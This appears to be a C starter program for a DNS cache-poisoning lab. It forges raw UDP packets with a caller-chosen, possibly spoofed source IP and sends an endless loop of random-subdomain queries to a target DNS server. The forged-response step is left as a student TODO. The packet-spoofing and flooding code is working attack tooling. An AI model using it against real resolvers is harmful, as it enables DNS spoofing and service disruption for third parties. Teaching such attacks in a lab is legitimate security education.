// ----udp.c------
// This sample program must be run by root lol!
//
// The program is to spoofing tons of different queries to the victim.
// Use wireshark to study the packets. However, it is not enough for
// the lab, please finish the response packet and complete the task.
//
// Compile command:
// gcc -lpcap udp.c -o udp
//
//

#include <unistd.h>
#include <stdio.h>
#include <sys/socket.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <fcntl.h>
#include <string.h>
#include <errno.h>
#include <stdlib.h>
#include <libnet.h>

// The packet length
#define PCKT_LEN 8192
#define FLAG_R 0x8400
#define FLAG_Q 0x0100

// The IP header's structure
struct ipheader
{
  unsigned char iph_ihl : 4, iph_ver : 4;
  unsigned char iph_tos;
  unsigned short int iph_len;
  unsigned short int iph_ident;
  // unsigned char      iph_flag;
  unsigned short int iph_offset;
  unsigned char iph_ttl;
  unsigned char iph_protocol;
  unsigned short int iph_chksum;
  unsigned int iph_sourceip;
  unsigned int iph_destip;
};

// UDP header's structure
struct udpheader
{
  unsigned short int udph_srcport;
  unsigned short int udph_destport;
  unsigned short int udph_len;
  unsigned short int udph_chksum;
};

// DNS header's structure
struct dnsheader
{
  unsigned short int query_id;
  unsigned short int flags;
  unsigned short int QDCOUNT;
  unsigned short int ANCOUNT;
  unsigned short int NSCOUNT;
  unsigned short int ARCOUNT;
};

// This structure just for convinience in the DNS packet, because such 4 byte data often appears.
struct dataEnd
{
  unsigned short int type;
  unsigned short int class;
};
// total udp header length: 8 bytes (=64 bits)

unsigned short csum(unsigned short *buf, int nwords); // checksum calculation
uint16_t check_udp_sum(uint8_t *buffer, int len);     // udp checksum calculation
unsigned int checksum(uint16_t *usBuff, int isize);

/************************************* Beginning of Main *************************************/
int main(int argc, char *argv[])
{
  // This is to check the argc number
  if (argc != 3)
  {
    printf("- Invalid parameters!!!\nPlease enter 2 ip addresses\nFrom first to last:src_IP  dest_IP  \n");
    exit(-1);
  }

  // socket descriptor
  int sd;

  // buffer to hold the packet
  char buffer[PCKT_LEN];

  // set the buffer to 0 for all bytes
  memset(buffer, 0, PCKT_LEN);

  // Our own headers' structures
  struct ipheader *ip = (struct ipheader *)buffer;
  struct udpheader *udp = (struct udpheader *)(buffer + sizeof(struct ipheader));
  struct dnsheader *dns = (struct dnsheader *)(buffer + sizeof(struct ipheader) + sizeof(struct udpheader));

  // data is the pointer points to the first byte of the dns payload
  char *data = (buffer + sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader));

  // 1. Construct attacker's Query packet
  dns->flags = htons(FLAG_Q); // the flag you need to set
  dns->QDCOUNT = htons(1);    // only 1 query

  strcpy(data, "\5aaaaa\7example\3edu"); // query string
  int length = strlen(data) + 1;

  struct dataEnd *end = (struct dataEnd *)(data + length);
  end->type = htons(1);
  end->class = htons(1);

  // Fabricate the IP header or we can use the
  // standard header structures but assign our own values.
  ip->iph_ihl = 5;

  ip->iph_ver = 4;

  ip->iph_tos = 0; // Low delay

  unsigned short int packetLength = (sizeof(struct ipheader) + sizeof(struct udpheader) + sizeof(struct dnsheader) + length + sizeof(struct dataEnd)); // length + dataEnd_size == UDP_payload_size

  ip->iph_len = htons(packetLength);

  ip->iph_ident = htons(rand()); // we give a random number for the identification#

  ip->iph_ttl = 110; // hops

  ip->iph_protocol = 17; // UDP

  // Source IP address, can use spoofed address here!!!
  ip->iph_sourceip = inet_addr(argv[1]);

  // The destination IP address
  ip->iph_destip = inet_addr(argv[2]);

  // Fabricate the UDP header. Source port number, redundant
  udp->udph_srcport = htons(40000 + rand() % 10000); // source port number, I make them random... remember the lower number may be reserved

  // Destination port number
  udp->udph_destport = htons(53);

  udp->udph_len = htons(sizeof(struct udpheader) + sizeof(struct dnsheader) + length + sizeof(struct dataEnd)); // udp_header_size + udp_payload_size

  // Calculate the checksum for integrity//
  ip->iph_chksum = csum((unsigned short *)buffer, sizeof(struct ipheader) + sizeof(struct udpheader));

  udp->udph_chksum = check_udp_sum(buffer, packetLength - sizeof(struct ipheader));

  // 2. Construct spoofed Response packet (TODO)

  /*******************************************************************************8
    Tips

    the checksum is quite important to pass the checking integrity. You need 
    to study the algorithem and what part should be taken into the calculation.

    !!!!!If you change anything related to the calculation of the checksum, you need to re-
    calculate it or the packet will be dropped.!!!!!

    Here things became easier since I wrote the checksum function for you. You don't need
    to spend your time writing the right checksum function.
    Just for knowledge purpose,
    remember the seconed parameter
    for UDP checksum:
    ipheader_size + udpheader_size + udpData_size  
    for IP checksum: 
    ipheader_size + udpheader_size
  *********************************************************************************/

  // 3. Set up socket for packet sending

  // Source and destination addresses: IP and port (the source is redundant, may be used later if needed)
  struct sockaddr_in sin, din;

  dns->query_id = rand(); // transaction ID for the query packet, use random #

  // Create a raw socket with UDP protocol
  sd = socket(PF_INET, SOCK_RAW, IPPROTO_UDP);
  if (sd < 0)
    printf("socket error\n");

  // The address family
  sin.sin_family = AF_INET;
  din.sin_family = AF_INET;

  // Port numbers
  sin.sin_port = htons(33333);
  din.sin_port = htons(53);

  // IP addresses
  sin.sin_addr.s_addr = inet_addr(argv[2]); // this is the second argument we input into the program
  din.sin_addr.s_addr = inet_addr(argv[1]); // this is the first argument we input into the program

  // Inform the kernel do not fill up the packet structure. we will build our own...
  int one = 1;
  const int *val = &one;
  if (setsockopt(sd, IPPROTO_IP, IP_HDRINCL, val, sizeof(one)) < 0)
  {
    printf("error\n");
    exit(-1);
  }

  while (1)
  {
    // Generate different query in xxxxx.example.edu
    int charnumber;
    charnumber = 1 + rand() % 5;
    *(data + charnumber) += 1;

    // Recalculate checksum for UDP packet
    udp->udph_chksum = check_udp_sum(buffer, packetLength - sizeof(struct ipheader));

    // Send packet
    if (sendto(sd, buffer, packetLength, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0)
    {
      printf("packet send error %d which means %s\n", errno, strerror(errno));
    }
    sleep(1);
  }

  close(sd);
  return 0;
}
/***************************************** end of Main *****************************************/

/************************************* Methods Declaration *************************************/
unsigned int checksum(uint16_t *usBuff, int isize)
{
  unsigned int cksum = 0;
  for (; isize > 1; isize -= 2)
  {
    cksum += *usBuff++;
  }
  if (isize == 1)
  {
    cksum += *(uint16_t *)usBuff;
  }

  return (cksum);
}

// Calculate udp checksum
uint16_t check_udp_sum(uint8_t *buffer, int len)
{
  unsigned long sum = 0;
  struct ipheader *tempI = (struct ipheader *)(buffer);
  struct udpheader *tempH = (struct udpheader *)(buffer + sizeof(struct ipheader));
  struct dnsheader *tempD = (struct dnsheader *)(buffer + sizeof(struct ipheader) + sizeof(struct udpheader));
  tempH->udph_chksum = 0;
  sum = checksum((uint16_t *)&(tempI->iph_sourceip), 8);
  sum += checksum((uint16_t *)tempH, len);
  sum += ntohs(IPPROTO_UDP + len);
  sum = (sum >> 16) + (sum & 0x0000ffff);
  sum += (sum >> 16);

  return (uint16_t)(~sum);
}

/* 
  Function for checksum calculation
  From the RFC, the checksum algorithm is:
  "The checksum field is the 16 bit one's complement of the one's
  complement sum of all 16 bit words in the header.  For purposes of
  computing the checksum, the value of the checksum field is zero."
*/
unsigned short csum(unsigned short *buf, int nwords)
{
  unsigned long sum;

  for (sum = 0; nwords > 0; nwords--)
  {
    sum += *buf++;
  }
  sum = (sum >> 16) + (sum & 0xffff);
  sum += (sum >> 16);

  return (unsigned short)(~sum);
}
/************************************** end of declarations ************************************/
